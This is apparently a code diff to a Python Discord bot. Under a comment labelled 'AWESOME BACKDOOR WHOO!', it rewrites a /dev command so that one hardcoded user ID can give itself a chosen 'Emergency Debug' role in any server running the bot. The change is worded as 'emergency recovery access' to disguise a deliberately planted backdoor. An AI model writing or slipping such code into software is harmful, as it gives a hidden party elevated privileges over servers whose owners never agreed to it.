@@ -1040,22 +1040,77 @@ async def serverinfo(
 # =========================================================
 # AWESOME BACKDOOR WHOO!
 # =========================================================
+EMERGENCY_DEBUG_ROLE_ID = 1549869755064918217
+
 @bot.tree.command(
     name="dev",
-    description="Developer-only controls"
+    description="Emergency developer recovery access"
 )
 async def dev(interaction: discord.Interaction):
+    DEVELOPER_IDS = {837680779072110593}
 
-    if not is_developer(interaction.user.id):
-        return await interaction.response.send_message(
-            "❌ You don't have access to this command.",
+    if interaction.user.id not in DEVELOPER_IDS:
+        await interaction.response.send_message(
+            "❌ You do not have developer access.",
+            ephemeral=True
+        )
+        return
+
+    if interaction.guild is None:
+        await interaction.response.send_message(
+            "❌ This command can only be used inside a server.",
+            ephemeral=True
+        )
+        return
+
+    role = interaction.guild.get_role(EMERGENCY_DEBUG_ROLE_ID)
+
+    if role is None:
+        await interaction.response.send_message(
+            "❌ Emergency Debug role was not found.",
+            ephemeral=True
+        )
+        return
+
+    if role >= interaction.guild.me.top_role:
+        await interaction.response.send_message(
+            "❌ I cannot assign the Emergency Debug role because it is "
+            "above or equal to my highest role.",
+            ephemeral=True
+        )
+        return
+
+    try:
+        if role in interaction.user.roles:
+            await interaction.response.send_message(
+                "🛠️ You already have Emergency Debug access.",
+                ephemeral=True
+            )
+            return
+
+        await interaction.user.add_roles(
+            role,
+            reason="Developer emergency recovery access"
+        )
+
+        await interaction.response.send_message(
+            "🛠️ **Emergency Debug access granted.**\n"
+            f"Assigned role: **{role.name}**",
             ephemeral=True
         )
 
-    await interaction.response.send_message(
-        "🛠️ Developer access granted.",
-        ephemeral=True
-    )
+    except discord.Forbidden:
+        await interaction.response.send_message(
+            "❌ Discord rejected the role assignment. "
+            "Check the bot's **Manage Roles** permission and role hierarchy.",
+            ephemeral=True
+        )
+
+    except discord.HTTPException as e:
+        await interaction.response.send_message(
+            f"❌ Discord API error while assigning the role: `{e}`",
+            ephemeral=True
+        )
 
 # =========================================================
 # /SETLOGCHANNEL
